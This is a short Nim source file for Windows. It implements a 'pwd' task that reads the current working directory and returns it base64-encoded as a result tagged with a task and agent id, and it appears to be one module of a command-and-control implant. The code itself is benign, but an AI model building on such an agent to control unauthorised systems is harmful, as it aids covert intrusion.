import os, strutils, strformat, base64, winim

import ../types

proc taskPwd*(task: Task): TaskResult = 

    echo fmt"Retrieving current working directory."

    try: 
        
        # Get current working directory using GetCurrentDirectory
        let 
            buffer = newWString(MAX_PATH + 1)
            length = GetCurrentDirectoryW(MAX_PATH, &buffer)
        
        if length == 0:
            raise newException(OSError, "Failed to get working directory.")

        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode($buffer[0 ..< (int)length] & "\n"),
            status: Completed
        )

    except CatchableError as err: 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(fmt"An error occured: {err.msg}" & "\n"),
            status: Failed 
        )